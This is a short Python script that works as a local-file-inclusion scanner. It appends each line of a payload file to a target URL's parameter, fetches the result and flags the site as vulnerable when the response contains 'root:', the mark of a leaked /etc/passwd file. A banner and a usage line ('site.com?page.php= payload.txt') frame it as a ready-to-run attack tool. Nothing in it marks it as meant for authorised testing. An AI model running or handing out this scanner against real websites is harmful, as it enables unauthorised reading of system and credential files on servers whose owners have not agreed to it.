import os 
import re
import sys
import requests

from pyfiglet import Figlet

class couleur:
		  	OK = '\033[91m' 
		  	ba= '\033[92m' 
		  		

figlet = Figlet(font='slant')
result = figlet.renderText("Ys jhonson")
dak= figlet.renderText("Le wana")

print(couleur.ba+result)
print(couleur.ba+dak)

try :
	
	list1=sys.argv[1]
	list2 = sys.argv[2]
	file = open(list2, 'r')
	for b in file:
					c = b.strip()
					d = list1.strip()
					req = requests.get(d+c)
					req1 =str(req.content)
					red = re.search('root:', req1)
					if red :
						class couleur:
							OK = '\033[91m'
							ba= '\033[92m'
						print(couleur.ba+req.url+' '+'Lfi detected [+]')
					else :
						class couleur:
							OK = '\033[91m'
							ba= '\033[92m'
						print(couleur.OK+req.url+' '+'No Lfi detected [+]')				
						
except :
	print ('python lfi.py site.com?page.php= payload.txt')																		
